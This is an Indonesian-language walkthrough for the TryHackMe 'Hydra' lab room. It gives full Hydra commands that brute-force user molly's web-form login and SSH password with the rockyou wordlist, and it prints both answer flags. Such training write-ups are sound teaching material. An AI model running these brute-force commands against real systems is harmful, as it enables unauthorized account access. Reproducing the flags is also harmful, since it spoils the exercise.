# Solusi - Hydra
- TryHackMe Room: [https://tryhackme.com/room/hydra](https://tryhackme.com/room/hydra)
- IP Machine: 10.10.93.97

## Pertanyaan/Tugas:
- Buka url http://10.10.93.97 di browser, setelah dibuka kita langsung diarahkan ke halaman login
- Lakukan brute force untuk menemukan password dari user molly. Gunakan baris perintah `hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.93.97 http-post-form "/login:username=^USER^&password=^PASS^:incorrect"`
- Gunakan username dan password diatas untuk melakukan login, setelah login kita berhasil mendapatkan flag1

Pertanyaan: Use Hydra to bruteforce molly's web password. What is flag 1?
Jawaban:
```sh
THM{2673a7dd116de68e85c48ec0b1f2612e}
```

- Lakukan brute force untuk menemukan password SSH dari user molly. Gunakan baris perintah `hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.93.97 ssh`

- Gunakan username dan password diatas untuk mengakses SSH, setelah berhasil masuk kita berhasil menemukan file flag2.txt. Buka file tersebut menjawab pertanyaan berikutnya

Pertanyaan: Use Hydra to bruteforce molly's SSH password. What is flag 2?
Jawaban:
```sh
THM{c8eeb0468febbadea859baeb33b2541b}
```